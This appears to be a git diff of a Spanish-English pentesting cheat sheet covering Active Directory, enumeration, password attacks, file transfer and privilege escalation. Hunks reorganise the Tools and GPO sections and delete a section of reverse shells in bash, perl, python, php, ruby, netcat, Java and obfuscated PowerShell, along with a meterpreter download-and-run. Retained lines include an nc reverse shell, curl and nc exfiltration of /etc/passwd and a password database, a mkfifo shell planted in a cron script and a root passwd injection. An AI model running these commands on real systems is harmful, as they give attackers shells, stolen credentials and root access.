@@ -2,7 +2,6 @@
 - [Enumeracion](#Enumeracion)
 - [Password Attacks](#password-attacks)
 - [File Transfers](#file-transfers)
-- [Reverse Shells](#reverse-shells)
 - [Ofuscación](#ofuscacion)
 - [Explotacion](#explotacion)
 - [Persistencia](#persistencia)
@@ -32,13 +31,6 @@ ticketConverter.py ticket.kirbi ticket.ccache
 KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
 
 # Enumeracion
-
-## GPO
-
-gpp-decrypt GROUPPOLICYPASSWORD
-
-Estos se encuentran en un xml 
-Example -> edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 
 ## RPC
 
@@ -124,132 +116,6 @@ gobuster dir -u [URL] -w /usr/share/wordlists/dirbuster/directory-list-2.3-mediu
 
 -w /usr/share/wordlists/dirb/common.txt  
 ```
-## Tools
-
-### Certipy
-https://github.com/ly4k/Certipy
-
-### FullPowers
-https://github.com/itm4n/FullPowers
-FullPowers is a Proof-of-Concept tool I made for automatically recovering the default privilege set of a service account including SeAssignPrimaryToken and SeImpersonate.
-```cmd
-FullPowers
-FullPowers -c "powershell -ep Bypass"
-FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
-```
-### LinEnum
-https://github.com/rebootuser/LinEnum
-
-### linuxprivchecker
-https://github.com/sleventyeleven/linuxprivchecker
-```sh
-python linuxprivchecker.py -w -o linuxprivchecker.log
-```
-### mimikatz
-https://github.com/ParrotSec/mimikatz
-
-### PowerCat
-https://github.com/besimorhino/powercat
-
-### Powermad
-https://github.com/Kevin-Robertson/Powermad
-
-### PowerView
-https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
-
-
-### PrivescCheck
-
-Cargar el script
-```cmd
-. .\PrivescCheck.ps1
-
-Set-ExecutionPolicy Bypass -Scope process -Force
-. .\PrivescCheck.ps1
-
-Get-Content .\PrivescCheck.ps1 | Out-String | IEX
-```
-Uso 
-```sh
-Invoke-PrivescCheck -Extended
-Invoke-PrivescCheck -Extended -Report "PrivescCheck_$($env:COMPUTERNAME)"
-```
-
-### Rubeus
-https://github.com/GhostPack/Rubeus
-
-### SharpHound
-https://github.com/BloodHoundAD/SharpHound
-
-
-
-### username-anarchy
-https://github.com/urbanadventurer/username-anarchy
-
-Formatos
-```sh
-./username-anarchy --list-formats
-Plugin name         	Example
---------------------------------------------------------------------------------
-first               	anna
-firstlast           	annakey
-first.last          	anna.key
-firstlast[8]        	annakey
-firstl              	annak
-f.last              	a.key
-flast               	akey
-lfirst              	kanna
-l.first             	k.anna
-lastf               	keya
-last                	key
-last.f              	key.a
-last.first          	key.anna
-FLast               	AKey
-first1              	anna0,anna1,anna2
-fl                  	ak
-fmlast              	abkey
-firstmiddlelast     	annaboomkey
-fml                 	abk
-FL                  	AK
-FirstLast           	AnnaKey
-First.Last          	Anna.Key
-Last                	Key
-FML                 	ABK
-```
-```sh
-./username-anarchy --input-file ./test-names.txt  --select-format first.last
-andrew.horton
-jim.vongrippenvud
-peter.otoole
-```
-### windapsearch
-windapsearch is a Python script to help enumerate users, groups and computers from a Windows domain through LDAP queries. By default, Windows Domain Controllers support basic LDAP operations through port 389/tcp. With any valid domain account (regardless of privileges), it is possible to perform LDAP queries against a domain controller for any AD related information.
-```sh
-./windapsearch.py -d lab.ropnop.com -u ropnop\\ldapbind -p GoCubs16 -U
-./windapsearch.py -d lab.ropnop.com -u ropnop\\ldapbind -p GoCubs16 -s albert
-./windapsearch.py -d lab.ropnop.com -u ropnop\\ldapbind -p GoCubs16 -C -r
-windapsearch# ./windapsearch.py -d lab.ropnop.com -u ropnop\\ldapbind -p GoCubs16 --da
-```
-### accesschk
-```cmd
-accesschk.exe /accepteula (always do this first!!!!!)
-accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)
-accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
-accesschk.exe -ucqv [service_name]
-```
-// Find all weak folder permissions per drive.
-```cmd
-accesschk.exe -uwdqs Users c:\
-accesschk.exe -uwdqs "Authenticated Users" c:\
-```
-// Find all weak file permissions per drive.
-```cmd
-accesschk.exe -uwqs Users c:\*.*
-accesschk.exe -uwqs "Authenticated Users" c:\*.*
-```
-### Git
-
-https://github.com/arthaud/git-dumper.git
 
 ## SNMP
 
@@ -417,17 +283,6 @@ Obtener el Domain
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 ```
 
-### Sharphound
-
-Import-Module .\Sharphound.ps1
-https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/bloodhound
-
-### Powerview
-
-PS C:\Tools> Import-Module .\PowerView.ps1
-
-https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
-
 ### Service Principal Names
 
 c:\Tools>setspn -L iis_service
@@ -446,12 +301,140 @@ nslookup.exe web04.corp.com
 
 ## LLMNR/NBT-NS
 
-# You can Man in The Middle using LLMNR and NBT-NS if they're bad configured
+You can Man in The Middle using LLMNR and NBT-NS if they're bad configured
+```sh
 sudo responder -I eth0 -wFv
-
+```
 # If you get hashes, will be necessary to crack them
+```sh
 john --format=netntlmv2 --wordlist="/usr/share/wordlists/rockyou.txt" hash.txt 
+```
+## Tools
 
+### Certipy
+https://github.com/ly4k/Certipy
+
+### FullPowers
+https://github.com/itm4n/FullPowers
+FullPowers is a Proof-of-Concept tool I made for automatically recovering the default privilege set of a service account including SeAssignPrimaryToken and SeImpersonate.
+```cmd
+FullPowers
+FullPowers -c "powershell -ep Bypass"
+FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
+```
+### LinEnum
+https://github.com/rebootuser/LinEnum
+
+### linuxprivchecker
+https://github.com/sleventyeleven/linuxprivchecker
+```sh
+python linuxprivchecker.py -w -o linuxprivchecker.log
+```
+### mimikatz
+https://github.com/ParrotSec/mimikatz
+
+### PowerCat
+https://github.com/besimorhino/powercat
+
+### Powermad
+https://github.com/Kevin-Robertson/Powermad
+
+### PowerView
+https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
+
+
+### PrivescCheck
+
+Cargar el script
+```cmd
+. .\PrivescCheck.ps1
+
+Set-ExecutionPolicy Bypass -Scope process -Force
+. .\PrivescCheck.ps1
+
+Get-Content .\PrivescCheck.ps1 | Out-String | IEX
+```
+Uso 
+```sh
+Invoke-PrivescCheck -Extended
+Invoke-PrivescCheck -Extended -Report "PrivescCheck_$($env:COMPUTERNAME)"
+```
+
+### Rubeus
+https://github.com/GhostPack/Rubeus
+
+### SharpHound
+https://github.com/BloodHoundAD/SharpHound
+
+
+
+### username-anarchy
+https://github.com/urbanadventurer/username-anarchy
+
+Formatos
+```sh
+./username-anarchy --list-formats
+Plugin name         	Example
+--------------------------------------------------------------------------------
+first               	anna
+firstlast           	annakey
+first.last          	anna.key
+firstlast[8]        	annakey
+firstl              	annak
+f.last              	a.key
+flast               	akey
+lfirst              	kanna
+l.first             	k.anna
+lastf               	keya
+last                	key
+last.f              	key.a
+last.first          	key.anna
+FLast               	AKey
+first1              	anna0,anna1,anna2
+fl                  	ak
+fmlast              	abkey
+firstmiddlelast     	annaboomkey
+fml                 	abk
+FL                  	AK
+FirstLast           	AnnaKey
+First.Last          	Anna.Key
+Last                	Key
+FML                 	ABK
+```
+```sh
+./username-anarchy --input-file ./test-names.txt  --select-format first.last
+andrew.horton
+jim.vongrippenvud
+peter.otoole
+```
+### windapsearch
+windapsearch is a Python script to help enumerate users, groups and computers from a Windows domain through LDAP queries. By default, Windows Domain Controllers support basic LDAP operations through port 389/tcp. With any valid domain account (regardless of privileges), it is possible to perform LDAP queries against a domain controller for any AD related information.
+```sh
+./windapsearch.py -d lab.ropnop.com -u ropnop\\ldapbind -p GoCubs16 -U
+./windapsearch.py -d lab.ropnop.com -u ropnop\\ldapbind -p GoCubs16 -s albert
+./windapsearch.py -d lab.ropnop.com -u ropnop\\ldapbind -p GoCubs16 -C -r
+windapsearch# ./windapsearch.py -d lab.ropnop.com -u ropnop\\ldapbind -p GoCubs16 --da
+```
+### accesschk
+```cmd
+accesschk.exe /accepteula (always do this first!!!!!)
+accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)
+accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
+accesschk.exe -ucqv [service_name]
+```
+// Find all weak folder permissions per drive.
+```cmd
+accesschk.exe -uwdqs Users c:\
+accesschk.exe -uwdqs "Authenticated Users" c:\
+```
+// Find all weak file permissions per drive.
+```cmd
+accesschk.exe -uwqs Users c:\*.*
+accesschk.exe -uwqs "Authenticated Users" c:\*.*
+```
+### Git
+
+https://github.com/arthaud/git-dumper.git
 
 
 # Password Attacks
@@ -466,6 +449,13 @@ hydra -l administrator -P wordlist.txt 1.1.1.1 ssh
 
 hydra 1.1.1.1:80 http-form-post "/PHP/index.php:nickname=^USER^&password=^PASS^:bad password" -l garry -P /usr/share/wordlists/nmap.lst -t 10 -w 30 -o hydra-http-post-attack.txt
 ```
+
+## GPO
+
+gpp-decrypt GROUPPOLICYPASSWORD
+
+Estos se encuentran en un xml 
+Example -> edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 
 ## Creacion de diccionario
 ```sh
@@ -645,7 +635,7 @@ curl --upload-file /etc/passwd http://10.10.10.10
 ```sh
 nc.exe -w 3 10.10.14.45 1235 < archivo.kdbx
 nc -lp 1235 > miarchivo.kdbx
-```cmd
+```
 
 ## Descargar desde powershell
 ```cmd
@@ -696,74 +686,6 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 ```
 
 
-# Reverse Shells
-
-
-Bash
-```sh
-bash -i >& /dev/tcp/10.10.10.10/7777 0>&1
-
-sh -i >& /dev/tcp/10.10.10.10/7777 0>&1
-```
-
-
-PERL
-
-```sh
-perl -e 'use Socket;$i="10.10.10.10";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-```
-
-Python
-
-```sh
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10”,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-```
-
-PHP
-
-```sh
-php -r '$sock=fsockopen("10.10.10.10”,7777);exec("/bin/sh -i <&3 >&3 2>&3");'
-```
-
-Ruby
-
-```sh
-ruby -rsocket -e'f=TCPSocket.open("10.10.10.10”,7777).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-```
-## Netcat
-### Linux
-
-```sh
-nc -vn 10.10.10.10 7777 -e /bin/sh 
-```
-
-Windows
-
-```sh
-nc.exe -vn 10.10.10.10 7777 -e cmd.exe
-```
-
-Java
-
-```sh
-r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/7777;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
-p.waitFor()
-```
-
-Powershell
-```cmd
-powershell.exe
-Start-Process $PSHOME\powershell.exe -ArgumentList {$2ade49964b1f45d3895f7a92eaf4c16c = New-Object Sy''st""em.Net.So''ck""ets.TC''PC""lie''nt('*LHOST*',*LPORT*);$477356af73714e84b32757bed7bf19d9 = $2ade49964b1f45d3895f7a92eaf4c16c.GetStream();[byte[]]$7ec1ae18501f4199b9d45c4546641020 = 0..65535|%{0};while(($i = $477356af73714e84b32757bed7bf19d9.Read($7ec1ae18501f4199b9d45c4546641020, 0, $7ec1ae18501f4199b9d45c4546641020.Length)) -ne 0){;$06e8b3156f9449e2bafb69c8905285be = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($7ec1ae18501f4199b9d45c4546641020,0, $i);$sendback = (iex $06e8b3156f9449e2bafb69c8905285be 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (p''w""d).Path + '> ';$33b751e1a76042b5a7abf9f2b7b9301a = ([text.encoding]::ASCII).GetBytes($sendback2);$477356af73714e84b32757bed7bf19d9.Write($33b751e1a76042b5a7abf9f2b7b9301a,0,$33b751e1a76042b5a7abf9f2b7b9301a.Length);$477356af73714e84b32757bed7bf19d9.Flush()};$2ade49964b1f45d3895f7a92eaf4c16c.Close()} -WindowStyle Hidden
-```
-
-PowerShell with nc.exe or another rev shell .exe
-
-```pwsh
-PowerShell (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.10/files/meterpreter.exe','meterpreter.exe');Start-Process ‘meterpreter.exe'
-Windows (Web app with command execution and nc.exe) 
-http://1.1.1.1/backdoor.php?cmd=%22nc.exe%20-vn%2010.10.10.10%207777%20-e%20cmd.exe%22
-```
 # Ofuscacion
 
 
@@ -997,38 +919,6 @@ Interactive Shells
 python -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
-Linux Scripts 
-
-```sh
-wget 10.10.10.10/linuxprivchecker.py
-python linuxprivchecker.py
-
-wget 10.10.10.10/linux-enum-mod.sh
-chmod +x  linux-enum-mod.sh
-sh linux-enum-mod.sh
-
-wget 10.10.10.10/linux-local-enum.sh
-chmod +x  linux-local-enum.sh
-sh linux-local-enum.sh
-
-wget 10.10.10.10/unix-privesc-check
-chmod +x ./unix-privesc-check
-./unix-privesc-check
-
-wget 10.10.10.10/solaris-exploit-suggester.pl
-perl solaris-exploit-suggester.pl
-
-https://github.com/DominicBreuker/pspy
-
-unix-privesc-check
-```
-
-Local
-
-```sh
-./linux-exploit-suggester.sh --uname 2.6.18-274.3.1.el5
-```
-
 Linux Commands
 ```sh
 uname -a
@@ -1075,6 +965,7 @@ for i in `cat process.txt` ; do  searchsploit %i ; done
 
 ## Procesos 
 
+```sh
 joe@debian-privesc:~$ watch -n 1 "ps -aux | grep pass"
 ...
 joe 16867 0.0 0.1 6352 2996 pts/0 S+ 05:41 0:00 watch -n 1 ps -aux | 
@@ -1083,23 +974,25 @@ root 16880 0.0 0.0 2384 756 ? S 05:41 0:00 sh -c sshpass -p
 'Lab123' ssh -t eve@127.0.0.1 'sleep 5;exit'
 root 16881 0.0 0.0 2356 1640 ? S 05:41 0:00 sshpass -p zzzzzz ssh 
 -t eve@127.0.0.1 sleep 5;exit
+```
 
+```sh
 joe@debian-privesc:~$ sudo tcpdump -i lo -A | grep "pass"
 [sudo] password for joe:
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
 listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
 ...{...zuser:root,pass:lab
-
+```
 ## Cronjobs 
-
+```sh
 grep "CRON" /var/log/syslog
-
+```
 Si tenemos acceso a un ejecutable entonces podemos poner el siguiente codigo
-
+```sh
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f" >> user_backups.sh
-
+```
 ## passwd
-
+```sh
 joe@debian-privesc:~$ openssl passwd w00t
 Fdzt.eqJQ4s0g
 joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> 
@@ -1108,19 +1001,20 @@ joe@debian-privesc:~$ su root2
 Password: w00t
 root@debian-privesc:/home/joe# id
 uid=0(root) gid=0(root) groups=0(root)
-
+```
 ## Kernel Vulnerabilities
-
- cat /etc/issue
- Ubuntu 16.04.4 LTS \n \l
- joe@ubuntu-privesc:~$ uname -r 
+```sh
+cat /etc/issue
+Ubuntu 16.04.4 LTS \n \l
+joe@ubuntu-privesc:~$ uname -r 
 4.4.0-116-generic
 joe@ubuntu-privesc:~$ arch
 x86_64
-
+```
+```sh
 searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep 
 "4." | grep -v " < 4.4.0" | grep -v "4.8"
-
+```
 ## Windows 
 
 WinRM
